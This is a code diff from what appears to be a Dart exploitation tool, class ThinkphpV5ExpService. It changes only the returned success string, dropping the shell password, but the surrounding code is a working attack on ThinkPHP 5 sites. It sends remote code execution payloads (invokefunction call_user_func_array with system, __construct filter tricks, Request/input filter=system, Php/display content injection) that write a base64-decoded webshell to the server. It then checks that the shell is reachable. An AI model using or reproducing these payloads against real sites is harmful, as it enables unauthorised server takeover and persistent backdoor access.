@@ -307,7 +307,7 @@ class ThinkphpV5ExpService {
         final u = '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=$cmd';
         await http.get(Uri.parse(u)).timeout(timeout);
         final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
+        return check.statusCode == 200 ? '$baseUri$shellFile' : null;
       case ThinkphpVulnType.tp5010:
         final base = '${baseUri}?s=$mod';
         final assertCode = "file_put_contents('./$shellFile','$shellForAssert');";
@@ -318,7 +318,7 @@ class ThinkphpV5ExpService {
         for (final body in payloads) {
           await http.post(Uri.parse(base), body: body).timeout(timeout);
           final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+          if (check.statusCode == 200) return '$baseUri$shellFile';
         }
         return null;
       case ThinkphpVulnType.tp5022_5129:
@@ -331,7 +331,7 @@ class ThinkphpV5ExpService {
         for (final u in payloads) {
           await http.get(Uri.parse(u)).timeout(timeout);
           final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+          if (check.statusCode == 200) return '$baseUri$shellFile';
         }
         return null;
       case ThinkphpVulnType.tp5023:
@@ -344,7 +344,7 @@ class ThinkphpV5ExpService {
         for (final body in systemPayloads) {
           await http.post(Uri.parse(payloadUrl), body: body).timeout(timeout);
           final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+          if (check.statusCode == 200) return '$baseUri$shellFile';
         }
         final assertCode = "file_put_contents('./$shellFile','$shellForAssert');";
         final assertPayloads = [
@@ -353,7 +353,7 @@ class ThinkphpV5ExpService {
         for (final body in assertPayloads) {
           await http.post(Uri.parse(payloadUrl), body: body).timeout(timeout);
           final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+          if (check.statusCode == 200) return '$baseUri$shellFile';
         }
         return null;
       case ThinkphpVulnType.tp5023Debug:
@@ -361,26 +361,26 @@ class ThinkphpV5ExpService {
         final body = {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd};
         await http.post(baseUri, body: body).timeout(timeout);
         final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
+        return check.statusCode == 200 ? '$baseUri$shellFile' : null;
       case ThinkphpVulnType.tp5ViewDisplay:
         final phpCode = "<?php file_put_contents('$shellFile', base64_decode('$shellB64'));?>";
         final contentEnc = Uri.encodeComponent(phpCode);
         final u = '${baseUri}?s=/$mod/\\think\\view\\driver\\Php/display&content=$contentEnc';
         await http.get(Uri.parse(u)).timeout(timeout);
         final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
+        return check.statusCode == 200 ? '$baseUri$shellFile' : null;
       case ThinkphpVulnType.tp5MethodFilter:
         final cmd = "echo '$shellB64'|base64 -d>$shellFile";
         final body = {'c': 'system', 'f': cmd, '_method': 'filter'};
         await http.post(baseUri, body: body).timeout(timeout);
         final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
+        return check.statusCode == 200 ? '$baseUri$shellFile' : null;
       case ThinkphpVulnType.tp5024_5130:
         final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
         final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$cmd';
         await http.get(Uri.parse(u)).timeout(timeout);
         final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
-        return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
+        return check.statusCode == 200 ? '$baseUri$shellFile' : null;
       default:
         return null;
     }
